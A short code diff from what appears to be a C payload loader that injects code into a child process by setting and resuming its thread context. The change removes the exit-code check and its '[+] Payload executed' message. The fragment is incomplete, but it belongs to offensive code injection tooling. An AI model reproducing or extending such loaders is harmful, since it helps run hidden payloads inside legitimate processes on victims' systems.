@@ -272,9 +272,5 @@ int main() {
       SetThreadContext(pi.hThread, context);
       ResumeThread(pi.hThread);
       WaitForSingleObject(pi.hThread, INFINITE);
-      DWORD childExitCode;
-      GetExitCodeProcess(hChildProcess, &childExitCode);
-      if(childExitCode) printf("[+] Payload executed, have a nice day.\n");
-      else printf("[!] Something went wrong.\n"); 
       return 0;
 }
